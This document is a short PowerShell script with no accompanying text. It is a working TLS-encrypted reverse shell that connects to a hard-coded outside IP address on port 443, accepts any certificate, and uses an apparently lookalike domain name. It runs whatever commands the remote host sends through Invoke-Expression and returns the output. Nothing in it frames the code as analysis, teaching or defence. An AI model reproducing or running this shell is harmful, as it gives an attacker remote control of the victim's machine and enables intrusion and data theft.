$a = New-Object Net.Sockets.TcpClient('120.156.138.160', 443)
$b = $a.GetStream()
$c = New-Object System.Net.Security.SslStream($b,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
$c.AuthenticateAsClient('lvanhoe.com', $null, "Tls12", $false)
$d = new-object System.IO.StreamWriter($c)
$d.Write('PS ' + (pwd).Path + '> ')
$d.flush()
[byte[]]$e = 0..65535|%{0};
while(($i = $c.Read($e, 0, $e.Length)) -ne 0)
{$f = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($e,0, $i);
$g = (iex $f | Out-String ) 2>&1;
$g2 = $g + 'PS ' + (pwd).Path + '> ';
$h = ([text.encoding]::ASCII).GetBytes($g2);
$c.Write($h,0,$h.Length);$c.Flush()}
